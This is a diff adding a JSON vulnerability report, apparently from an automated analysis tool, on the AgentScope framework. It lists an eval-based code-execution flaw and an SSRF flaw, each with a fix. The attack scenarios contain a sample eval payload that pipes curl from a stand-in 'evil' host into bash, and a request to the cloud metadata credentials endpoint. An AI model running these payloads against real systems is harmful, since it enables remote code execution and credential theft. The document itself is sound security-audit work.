@@ -1,0 +1,145 @@
+{
+  "json_path": "/srv/home/shiqiu/AgentXploit/src/analysis_agent/reports/analysis_6747_20260127_200601.json",
+  "created_at": "2026-01-27 20:06:03",
+  "last_updated": "2026-01-27 20:10:19",
+  "status": "completed",
+  "environment": {
+    "framework": "Python multi-agent framework (AgentScope)",
+    "docker_required": false,
+    "entry_points": [
+      "setup.py console_scripts (as_studio, as_workflow)",
+      "scripts in scripts/ directory",
+      "examples/__main__.py style scripts"
+    ],
+    "config_files": [
+      "pyproject.toml",
+      "setup.py",
+      "README.md",
+      "docs/sphinx_doc/requirements.txt"
+    ]
+  },
+  "dependencies": [
+    "loguru==0.6.0",
+    "tiktoken",
+    "Pillow",
+    "requests",
+    "chardet",
+    "inputimeout",
+    "openai>=1.3.0",
+    "numpy",
+    "Flask==3.0.0",
+    "Flask-Cors==4.0.0",
+    "Flask-SocketIO==5.3.6",
+    "dashscope==1.14.1",
+    "ollama>=0.1.7",
+    "google-generativeai>=0.4.0",
+    "grpcio==1.60.0",
+    "grpcio-tools==1.60.0",
+    "protobuf==4.25.0",
+    "expiringdict",
+    "dill",
+    "docker",
+    "pymongo",
+    "pymysql",
+    "beautifulsoup4",
+    "feedparser",
+    "sphinx",
+    "sphinx-autobuild",
+    "sphinx_rtd_theme",
+    "myst-parser",
+    "sphinxcontrib-mermaid",
+    "pytest",
+    "pytest-cov",
+    "pre-commit",
+    "networkx",
+    "gradio==4.19.1",
+    "modelscope_studio==0.0.5",
+    "black",
+    "docstring_parser"
+  ],
+  "tools": [],
+  "traditional_vulnerabilities": {
+    "scan_type": "traditional",
+    "vulnerabilities": [
+      {
+        "type": "rce",
+        "severity": "critical",
+        "title": "Workflow configuration loading executes arbitrary Python via eval",
+        "description": "The AgentScope Workstation loader evaluates raw strings from workflow JSON files with Python's eval before any validation. `is_callable_expression` (lines 5-13) runs `eval(s)` on every argument value to see if it returns a callable, and `sanitize_node_data` (lines 267-280) re-evaluates any string flagged as callable. Because workflow configs are regular JSON files supplied by the user (e.g., via `as_workflow cfg.json`), an attacker only needs to convince an operator to open a malicious config. The eval executes immediately at load time, allowing arbitrary OS commands.",
+        "file_path": "src/agentscope/web/workstation/workflow_utils.py",
+        "line_numbers": [
+          5,
+          13
+        ],
+        "code_snippet": "def is_callable_expression(s: str) -> bool:\n    try:\n        if s in [\"input\", \"print\"]:\n            return False\n        result = eval(s)\n        return callable(result)\n    except Exception:\n        return False",
+        "attack_scenario": "1) Attacker shares a pre-built workflow JSON file.\n2) Victim runs `as_workflow malicious.json` locally.\n3) While loading, `sanitize_node_data` calls `is_callable_expression` on each argument string, which executes the attacker's expression. For example, setting a parameter to `(__import__('os').system('curl https://evil/sh | bash') or lambda: None)` runs the embedded shell command during eval before any workflow runs, yielding full code execution under the victim account.",
+        "impact": "Immediate remote code execution on the host running AgentScope Workstation; attacker can run arbitrary OS commands, steal data, or pivot.",
+        "evidence": "Workflow configs flow: `load_config` -> `build_dag` -> `sanitize_node_data` (workflow_dag.py lines 267-280) -> `is_callable_expression` (above). Both functions call eval on untrusted strings with no sandboxing.",
+        "cwe_id": "CWE-94",
+        "mitigation": "Never call eval on workflow data. Instead treat argument values as data: keep strings as-is or parse using `ast.literal_eval` for limited literals. If callable references are required, require explicit allow-listed names and map them to predefined callables without evaluating arbitrary expressions."
+      },
+      {
+        "type": "ssrf",
+        "severity": "high",
+        "title": "Unrestricted URL fetching in web digest service enables SSRF",
+        "description": "`load_web` and `digest_webpage` accept any URL string and issue a raw `requests.get` with no scheme or host validation. There is no allowlist, no private-address blocking, and redirects are followed. Any caller that can invoke the service (e.g., via AgentScope tools exposed to users or remote models) can force the server to fetch internal resources.",
+        "file_path": "src/agentscope/service/web/web_digest.py",
+        "line_numbers": [
+          40,
+          150
+        ],
+        "code_snippet": "def load_web(url: str, ... timeout: int = 5) -> ServiceResponse:\n    header = {...}\n    try:\n        response = requests.get(url=url, headers=header, timeout=timeout)\n        if response.status_code == 200:\n            ...\n        else:\n            return ServiceResponse(ServiceExecStatus.ERROR, content=\"\")",
+        "attack_scenario": "An adversary controlling an agent prompt or UI input asks the service to digest `http://169.254.169.254/latest/meta-data/iam/security-credentials/`. The backend fetches the cloud metadata endpoint and returns credentials in the ServiceResponse content, leaking internal secrets. Similar attacks can target Redis, Kubernetes API, or other internal HTTP services.",
+        "impact": "Server-side request forgery leading to disclosure of internal services, cloud metadata, or pivoting to internal networks. Depending on environment, can reveal credentials or send write requests internally.",
+        "evidence": "No host validation or scheme filtering occurs between `digest_webpage` (lines 235-253) and `load_web` (lines 40-150); `requests.get` is called directly with the untrusted `url`.",
+        "cwe_id": "CWE-918",
+        "mitigation": "Implement URL validation before fetching: restrict schemes to http/https, block private/reserved IP ranges (169.254/16, 10/8, 127/8, etc.), and enforce allowlists for known-safe domains. Disable redirects or validate each hop. Consider proxying requests through a hardened fetcher that enforces these rules."
+      }
+    ],
+    "summary": {
+      "total_vulnerabilities": 2,
+      "by_severity": {
+        "critical": 1,
+        "high": 1,
+        "medium": 0,
+        "low": 0
+      },
+      "by_type": {
+        "rce": 1,
+        "ssrf": 1
+      },
+      "files_affected": [
+        "src/agentscope/web/workstation/workflow_utils.py",
+        "src/agentscope/service/web/web_digest.py"
+      ]
+    },
+    "overall_risk": "critical",
+    "recommendations": [
+      "Remove unsafe eval usage when parsing workflow configs; use explicit allowlists or literal parsers instead.",
+      "Add strict URL validation and network allowlists before performing outbound fetches to prevent SSRF."
+    ]
+  },
+  "final_summary": {
+    "tools_analyzed": 0,
+    "tools_with_vulnerabilities": 0,
+    "tool_vulnerability_counts": {
+      "critical": 0,
+      "high": 0,
+      "medium": 0,
+      "low": 0
+    },
+    "traditional_vulnerability_counts": {
+      "critical": 1,
+      "high": 1,
+      "medium": 0,
+      "low": 0
+    },
+    "total_vulnerability_counts": {
+      "critical": 1,
+      "high": 1,
+      "medium": 0,
+      "low": 0
+    },
+    "overall_risk": "critical"
+  }
+}
